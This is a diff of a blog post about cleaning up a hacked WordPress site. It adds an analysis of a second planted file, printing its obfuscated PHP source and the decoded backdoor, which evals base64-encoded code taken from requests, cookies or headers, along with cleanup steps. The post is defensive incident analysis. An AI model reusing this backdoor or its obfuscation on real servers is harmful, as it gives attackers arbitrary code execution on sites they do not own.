@@ -65,6 +65,88 @@ $cmrxzr(strrev(';))"=oQD9lQCK0QfJkQCK0gCNsjZ1JGJg8GajVWCJkQCK0QfJkQCJoQDJkQCJkgC
 
 At the very end of the last line there is a piece of code: `edoced_46esab(lave')`, or read backwards: `eval(base64_decode(`. That confirms my above suspicion about the use of base 64 decoding.
 
+I also noticed another file named `sawsalag.php`. Very curious what that means. :)
+
+It's contents are yet another set of obscured code. This time it's a bit less obvious than a giant block of base 64. Instead it's obfuscated PHP.
+
+```{.php .numberLines startFrom="1"}
+<?php
+$bliss ='s';$eradicate='F';$canvassing= '_';$booms = '>'; $longer= 'NLs';$chi=';';$filthiest= 'O';
+$cadent = 'r';$magnanimous='e';
+$gilemette='d'; $justifiable= 'rBSNaes';
+$ashamedly = '$'; $culminates =']n_nS'; $constitutionality='E'; $flashlights='R';
+$cursed = 'tr$T"eG?8';$keri= ')';$erny = 'i';$endgame= '@(9)_'; $erinna= 'A_(';
+$grooves='M';
+$brittany ='u((';
+$jitter='QaR_aR;('; $andreana= 'i,A';$cop='$M"a[$pO';
+$instantiations ='('; $leniency= 'a)aE'; $bayou = 'bIJvCR'; $impaction= '('; $archaize='o[ n)nTe"'; $ellette ='5rgatu';$hideous = 'r';
+$chief='A';
+$elaborations= 'r';$comforters= 'IRS:n(ey)';$binders =':'; $burn ='c'; $dissenter='ev[o';$jillane = '"'; $loyalties = '])Ev'; $credulity='a';
+$keenan = 'c';$kimberley= 'o'; $declamatory ='"';$brokerage='e4Dce?<s'; $glib='tr;ra';$fiction='N'; $country = 's'; $haulage ='Br$sU';
+$countermeasures='Q';$ghastly = 'K';$explicate = '$Ho';$criss ='a'; $homebuild ='a'; $candler='o2da-'; $hamid ='/';
+$conspiracy= 'Or_Ht'; $fluoresce= 'Mrl"U)s';
+$grandson = ']e.';$buttered='TB('; $deathrate ='u'; $apprentice= '3';
+$auroora= 'Cie=r],t'; $faun ='P'; $dalila = 'e'; $arteriole= ')'; $ariela= 'm61eiT_i?';$eduino= '$O'; $iffy='sr(Eu(_T';$backplate ='"'; $keepers ='c';
+$brian ='gisfe)TE$'; $joanne ='i';
+$crucifying= '[';
+$culminates ='P';$intervenor=':$R)_g0"';
+$context = 'id'; $impinges=';'; $chock='b';$kinky= 'ayp';$coarsened='S';$conscience = 'vfUmt'; $escorts='s';
+$contracted='l'; $collected ='H'; $byran= 'm';$appanage ='V_eUS$PeO';
+$enumerable='i'; $loudspeaker='_;=7';
+$bruises='4';$dues ='b)tK'; $encountering= '='; $economy='6';
+$kingfisher= 'E';
+$lifetimes =$keepers.$iffy['1'] .$appanage[7] .$kinky['0']. $dues['2'].
+$appanage[7]. $loudspeaker['0'] .
+$conscience['1'] .$iffy['4'].
+$comforters['4'] .$keepers. $dues['2'] . $enumerable. $candler[0]. $comforters['4'] ;
+$apocalyptic= $archaize['2'] ;
+$hunters=$lifetimes ($apocalyptic,$appanage[7] .$conscience['0'].$kinky['0'].$contracted . $iffy[5] . $kinky['0']. $iffy['1'] .$iffy['1'] . $kinky['0'] . $kinky[1] .$loudspeaker['0'] .$kinky['2'] .$candler[0] .
+$kinky['2']. $iffy[5].$conscience['1'] . $iffy['4'] .$comforters['4'] .
+$keepers . $loudspeaker['0'] . $intervenor['5'] .$appanage[7]. $dues['2'] . $loudspeaker['0'].
+$kinky['0'] .$iffy['1'].
+$intervenor['5'].$escorts.
+$iffy[5] .$dues[1] .
+$dues[1] . $dues[1].$loudspeaker[1]); $hunters ($brokerage['2'] , $collected,$longer['1'], $insertion,
+$heda['5'], $iffy[5] ,
+$appanage['5'] .$enumerable.
+$encountering . $kinky['0'] .$iffy['1'] .$iffy['1'] .$kinky['0'].$kinky[1] .
+$loudspeaker['0'] .
+$byran . $appanage[7]. $iffy['1'] .$intervenor['5'].$appanage[7] .$iffy[5] . $appanage['5'].$loudspeaker['0'].$intervenor['2'].$kingfisher['0'] .$countermeasures . $appanage['3'].$kingfisher['0'] .
+$appanage['4'].$brian[6] .$auroora['6'] . $appanage['5'] .$loudspeaker['0'] .$auroora['0'] . $appanage[8].
+$appanage[8] .
+$dues['3']. $comforters['0']. $kingfisher['0'].
+$auroora['6'] . $appanage['5'] .
+$loudspeaker['0'] .$appanage['4'].$kingfisher['0'] . $intervenor['2'].$appanage['0'].$kingfisher['0']. $intervenor['2'] .
+$dues[1]. $loudspeaker[1] .$appanage['5'] . $kinky['0'].$encountering.
+$enumerable .
+$escorts .$escorts. $appanage[7].$dues['2'].$iffy[5] . $appanage['5'] .$enumerable.$crucifying. $intervenor[7] .
+$escorts. $iffy['4'].$iffy['1'] . $comforters['4'] .$byran.$candler[0] . $kinky['0'] .$dues['0'] .$intervenor[7]. $auroora['5'] .$dues[1] .$ariela[8] .$appanage['5'].$enumerable.
+$crucifying.$intervenor[7].
+$escorts . $iffy['4'] . $iffy['1'].$comforters['4'] . $byran .
+$candler[0].$kinky['0'].$dues['0']. $intervenor[7].
+$auroora['5'] . $intervenor['0'] .$iffy[5] .$enumerable. $escorts . $escorts.
+$appanage[7]. $dues['2'].
+$iffy[5] .$appanage['5'] . $enumerable. $crucifying. $intervenor[7] .
+$collected. $brian[6].$brian[6] .
+$appanage['6'].$loudspeaker['0'].$appanage['4']. $appanage['3'].$intervenor['2'] . $fiction. $fluoresce['0'].
+$appanage[8]. $chief .
+$buttered['1'] . $intervenor[7] .$auroora['5']. $dues[1] . $ariela[8] .
+$appanage['5'] .$enumerable .$crucifying . $intervenor[7]. $collected. $brian[6]. $brian[6]. $appanage['6'] .
+$loudspeaker['0'] .$appanage['4'] .$appanage['3'] . $intervenor['2'].
+$fiction.$fluoresce['0'] . $appanage[8]. $chief .$buttered['1'] . $intervenor[7]. $auroora['5'] .$intervenor['0'].$context['1'].$enumerable.$appanage[7].
+$dues[1] .$loudspeaker[1]. $appanage[7].
+$conscience['0'].
+$kinky['0'].$contracted .
+$iffy[5] .$escorts .$dues['2'] .
+$iffy['1'] . $iffy['1'].$appanage[7] . $conscience['0'].$iffy[5] .$dues['0'].$kinky['0'].
+$escorts. $appanage[7]. $economy.$bruises . $loudspeaker['0'] .
+$context['1'].$appanage[7].
+$keepers .
+$candler[0] .$context['1']. $appanage[7]. $iffy[5].
+$escorts .$dues['2']. $iffy['1'] . $iffy['1'].$appanage[7].$conscience['0']. $iffy[5]. $appanage['5'].$kinky['0']. $dues[1].$dues[1].$dues[1] .$dues[1] .
+$loudspeaker[1]);
+```
+
 ## Step 4. Get dirty and decipher the hack!
 
 I could skip straight to the cleanup phase (Step 5), but because that's boring, lets instead see what the "secret" blob of code is doing.
@@ -273,6 +355,25 @@ At this point I've also broken the attack file into three parts:
 2. The actual content-delivery logic. I call it content-delivery because depending on where the visitor comes from, they will get different content. Search engines, Mobile, and Bots all get different treatment. Using lookups within the `$curx` directory. `$curx` is simply `.` + `md5` of the host, and it lives in the root directory of the Wordpress installation.
 3. Deal with a missing `$curx` directory. A quick scan seems to reveal that the script first fetches the originally intended page, loads a list of links from the file `.fff.sess`, shuffles the links, replace links in the loaded webpage with spam links, then serves the content. This seems to be the scripts last-ditch effort to spam viewers in the event you delete the `$curx` directory. Unfortunately, my friend's blog did not have the `.fff.sess` file so I could not open it up to examine.
 
+The second file we discovered, `sawsalag.php`, has the worst surprise hidden in it however.
+
+A quick analysis shows a chain of variable settings, commas, and parenthesis. This quickly tells me that it's making function calls with a set of parameters. Time to start deciphering. I will start by printing out all the parameters and functions being generated.
+
+The deciphered code looks something like the below code. Here is a [Gist](https://gist.github.com/kennycason/3520b6bc4de6aad5fc4e3fe1b7287a7a) that shows how I deciphered the script.
+
+```{.php .numberLines startFrom="1"}
+create_function( ,eval(array_pop(func_get_args()));)
+response to function: lambda_1(
+$i=array_merge($_REQUEST,$_COOKIE,$_SERVER);
+$a=isset($i["surnmoab"])
+    ? $i["surnmoab"]
+    : (isset($i["HTTP_SURNMOAB"])
+        ? $i["HTTP_SURNMOAB"]
+        : die);
+eval(strrev(base64_decode(strrev($a))));
+```
+
+In other words, this script allows an attacker to run arbitrary code! This is very dangerous. Similar to above I also disabled the script and logged the requests so that I can analyze the kinds of code the attacker is trying to run.
 
 ## Step 5. Clean up and Fix
 
@@ -287,13 +388,13 @@ At this point we still don't know how the attacker got in but the scripts seem p
 
     Only continue if you understand the above comments and are ok with the risk of only partially removing your hacked code. For our hack it seems isolated so we'll just remove the files and better secure our system.
 
-1. Before taking steps to delete anything, the first thing I recommend is Googling similar hacks using keywords obtained from this attack. `lusts-disadvantages.php`, the content url, etc.
+1. Before taking steps to delete anything, the first thing I recommend is Googling similar hacks using keywords obtained from this attack `lusts-disadvantages.php`, `sawsalag.php`, the content url, etc. We are trying to find known solutions.
     - Nothing shows up when searching `lusts-disadvantages.php`.
     - A search for "Zi5tZW55dWRueWEuY29t" yields 4 results. Soon to be 5 :) The links lead to a few Stack Overflow questions: [here](http://stackoverflow.com/questions/35440654/i-found-this-wierd-php-file-on-my-server-it-seems-that-it-sabotaged-our-seo-in) and [here](http://stackoverflow.com/questions/29980379/astronautic-benchmark-php-virus-script). These posts reached a similar conclusion as I did, however, they don't provide a solution. I found this next [link](http://ddecode.com/phpdecoder/?results=4f7cc0b054934884a997f79c61fde981) particularly interesting. It shows a bunch of previous queries of people running php base 64 decode expressions. Very likely trying to do the same thing as me.
     - Every example seemed to route to a different file than `lusts-disadvantages.php`. This is most likely intentional to further reduce the chance of detection.
     - I also noticed different content download urls. This partially explains why my link 404'd.
 
-2. Update Wordpress and all plugins. This is also a good time to Google search each of your plugins to see if there are any known vulnerabilities. I also recommend only using plugins that are popular and thus well vetted. Usually attackers take advantage of known Wordpress and popular plugin vulnerabilities and can be very easily thwarted. The reason for attacking the core and popular plugins is directly linked to their large distribution. In terms of dollars, it's simple, if a hacker can exploit more pages, they can make more money through ads.
+2. Update Wordpress and all plugins. This is also a good time to Google search each of your plugins to see if there are any known vulnerabilities. I recommend using plugins that are popular and thus well vetted. This is caveated by the fact that popular plugins are also the most targeted by hackers, however they far also typically fixed/updated most frequently. The reason for attacking the core and popular plugins is directly linked to their large distribution. In terms of dollars, it's simple, if a hacker can exploit more pages, they can make more money through ads.
 
 3. Take the website offline for now. We are going to go through and remove files.
 
@@ -304,7 +405,7 @@ At this point we still don't know how the attacker got in but the scripts seem p
     RewriteRule ^(.*)$ lusts-disadvantage.php?$1 [L]
     ```
     - Next remove the `.md5(host)/` directory from the root of the Wordpress installation. A sample folder will look like `.00547420a52b40069b82beb76cdce8f7/`.
-    - Delete `lusts-disadvantages.php`, or whatever the decoded file name on your server turns out to be. It should be the "odd-duck" and will stand out.
+    - Delete `lusts-disadvantages.php` and `sawsalag.php`, or whatever the decoded file name on your server turns out to be. It should be the "odd-duck" and will stand out.
 
 4. Reset your FTP/SSH user account credentials. It is also recommended to create non-obvious usernames. i.e. don't use `root` or your first name.
 
